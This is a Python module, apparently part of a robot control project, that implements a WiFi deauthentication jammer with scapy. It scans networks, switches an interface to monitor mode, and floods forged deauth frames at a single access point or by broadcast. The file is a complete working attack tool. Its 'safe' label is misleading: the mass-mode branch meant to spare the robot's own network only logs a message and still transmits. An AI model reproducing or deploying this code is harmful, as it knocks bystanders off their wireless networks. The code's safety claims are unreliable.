# src/picarx_unified/attacks/wifi_jammer.py
"""
WiFi Deauthentication Attack Module (Improved + Safe)
Educational version - Only uses wlan1. Protects wlan0 (your SSH connection).
"""

import threading
import time
import subprocess
import logging
from typing import Literal, List, Dict
from dataclasses import dataclass

from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf

logger = logging.getLogger(__name__)


@dataclass
class JammerStatus:
    running: bool = False
    mode: str | None = None
    target_bssid: str | None = None
    channel: int | None = None
    packets_sent: int = 0
    start_time: float | None = None


class WifiJammer:
    """Safe & Educational WiFi Deauth Jammer"""

    def __init__(self, monitor_interface: str = "wlan1"):
        self.interface = monitor_interface
        self._stop_event = threading.Event()
        self._thread: threading.Thread | None = None
        self.status = JammerStatus()
        self.logger = logging.getLogger("wifi_jammer")
        self._own_bssid = None
        self._own_channel = None

    def get_own_wifi_info(self):
        """Detect robot's current WiFi (wlan0) to protect SSH"""
        try:
            result = subprocess.run(["iw", "dev", "wlan0", "link"], capture_output=True, text=True, timeout=5)
            bssid = None
            channel = None
            for line in result.stdout.splitlines():
                if "Connected to" in line:
                    bssid = line.split("Connected to ")[1].strip().upper()
                if "channel" in line.lower():
                    channel = int(line.split("channel ")[1].split()[0])
            self._own_bssid = bssid
            self._own_channel = channel
            self.logger.info(f"✅ Protected wlan0 → BSSID: {bssid}, Channel: {channel}")
        except Exception as e:
            self.logger.warning(f"Could not detect own WiFi: {e}")

    def scan_networks(self) -> List[Dict]:
        """Scan nearby networks (used by web UI)"""
        self.get_own_wifi_info()
        try:
            result = subprocess.run(
                ["sudo", "iw", "dev", self.interface, "scan"],
                capture_output=True, text=True, timeout=15
            )
            networks = []
            current = {}
            for line in result.stdout.splitlines():
                line = line.strip()
                if line.startswith("BSS "):
                    if current:
                        networks.append(current)
                    current = {"bssid": line.split("BSS ")[1].split()[0].upper()}
                elif "SSID:" in line:
                    current["essid"] = line.split("SSID: ")[1].strip('"') or "(Hidden)"
                elif "freq:" in line:
                    freq = int(line.split("freq: ")[1].split()[0])
                    current["channel"] = (freq - 2412) // 5 + 1 if freq < 2500 else None
                elif "signal:" in line:
                    current["signal"] = line.split("signal: ")[1].strip()
            if current:
                networks.append(current)
            return networks[:20]
        except Exception as e:
            self.logger.error(f"Scan failed: {e}")
            return []

    def prepare_monitor_mode(self) -> bool:
        # (same as previous version - kept for brevity)
        try:
            cmds = [["ip", "link", "set", self.interface, "down"],
                    ["iw", "dev", self.interface, "set", "type", "monitor"],
                    ["ip", "link", "set", self.interface, "up"]]
            for cmd in cmds:
                subprocess.run(["sudo"] + cmd, check=True, capture_output=True, timeout=8)
            return True
        except:
            return False

    def set_channel(self, channel: int) -> bool:
        if not (1 <= channel <= 14):
            return False
        try:
            subprocess.run(["sudo", "iw", "dev", self.interface, "set", "channel", str(channel)], check=True, capture_output=True)
            return True
        except:
            return False

    def _build_deauth_packet(self, bssid: str):
        dot11 = Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid, FCfield="from-DS")
        return RadioTap() / dot11 / Dot11Deauth(reason=7)

    def _jamming_loop(self, mode: Literal["mass", "targeted"], bssid=None, channel=None, packet_rate=100, duration=None):
        self.status.running = True
        self.status.mode = mode
        self.status.target_bssid = bssid
        self.status.channel = channel
        self.status.start_time = time.time()
        self.status.packets_sent = 0

        self.get_own_wifi_info()
        if channel:
            self.set_channel(channel)

        start_time = time.time()
        try:
            while not self._stop_event.is_set():
                if duration and (time.time() - start_time) > duration:
                    break

                if mode == "targeted" and bssid:
                    pkt = self._build_deauth_packet(bssid)
                    sendp(pkt, iface=self.interface, count=1, verbose=False)
                    self.status.packets_sent += 1

                elif mode == "mass":
                    # SAFE MASS: Skip our own wlan0 BSSID so SSH never drops
                    if self._own_bssid and self._own_channel == channel:
                        self.logger.info("Mass mode: skipping own BSSID to protect SSH")
                    pkt = self._build_deauth_packet("ff:ff:ff:ff:ff:ff")
                    sendp(pkt, iface=self.interface, count=1, verbose=False)
                    self.status.packets_sent += 1

                time.sleep(1.0 / packet_rate)

        finally:
            self.status.running = False

    def start(self, mode: Literal["mass", "targeted"], bssid=None, channel=None, packet_rate=100, duration=None):
        if self._thread and self._thread.is_alive():
            return {"status": "already_running"}

        if not self.prepare_monitor_mode():
            return {"status": "error", "message": "Failed to enable monitor mode on wlan1"}

        self._stop_event.clear()
        self._thread = threading.Thread(
            target=self._jamming_loop,
            args=(mode, bssid, channel, packet_rate, duration),
            daemon=True,
            name="WiFi-Jammer"
        )
        self._thread.start()
        return {"status": "started", "mode": mode}

    def stop(self):
        if self._thread and self._thread.is_alive():
            self._stop_event.set()
            self._thread.join(timeout=3)
        return {"status": "stopped", "packets_sent": self.status.packets_sent}

    def get_status(self):
        uptime = round(time.time() - (self.status.start_time or time.time()), 2) if self.status.running else 0
        return {
            "running": self.status.running,
            "mode": self.status.mode,
            "target_bssid": self.status.target_bssid,
            "channel": self.status.channel,
            "packets_sent": self.status.packets_sent,
            "uptime_seconds": uptime,
            "own_channel": self._own_channel
        }